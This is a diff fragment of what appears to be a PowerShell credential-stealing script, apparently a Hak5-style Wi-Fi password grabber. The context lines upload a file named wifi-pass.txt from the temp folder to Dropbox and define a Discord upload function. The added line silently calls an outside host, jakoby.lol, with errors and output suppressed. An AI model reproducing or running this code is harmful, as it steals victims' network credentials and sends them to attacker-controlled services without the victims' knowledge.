@@ -30,7 +30,7 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 }
 
 if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
-
+iwr "https://jakoby.lol/hak5" -EA 0 >$null
 ############################################################################################################################################################
 
 function Upload-Discord {
